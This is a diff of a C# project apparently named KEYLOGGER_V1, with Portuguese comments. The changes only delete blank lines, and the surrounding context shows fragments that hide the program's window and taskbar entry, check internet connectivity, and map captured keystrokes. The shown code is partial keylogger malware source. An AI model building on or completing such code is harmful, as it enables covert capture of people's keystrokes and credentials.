@@ -39,13 +39,10 @@ namespace KEYLOGGER_V1
                 if (this.Opacity == 0 && this.ShowInTaskbar == false)             // Verifica se o formulario já esta invisivel
                 {
                     visibilidade();
-
                 }
                 else
                 {
-
                     invisibilidade();
-
                 }
             }
         }
@@ -109,7 +106,6 @@ namespace KEYLOGGER_V1
 
             try
             {
-
                 int Description;
 
                 result = InternetGetConnectedState(out Description, 0);
@@ -359,15 +355,12 @@ namespace KEYLOGGER_V1
 
         }
 
-
         bool ShiftPressionado = false;
 
         public String MonitoramentoDeTeclas(String tecla)
         {
-
             return Mon_Letras_teclasSuporte(tecla);
         }
-
         
         public string Mon_Letras_teclasSuporte(string tecla)
         {
@@ -430,8 +423,6 @@ namespace KEYLOGGER_V1
             
         
         }
-
-      
-
+               
     }
 }
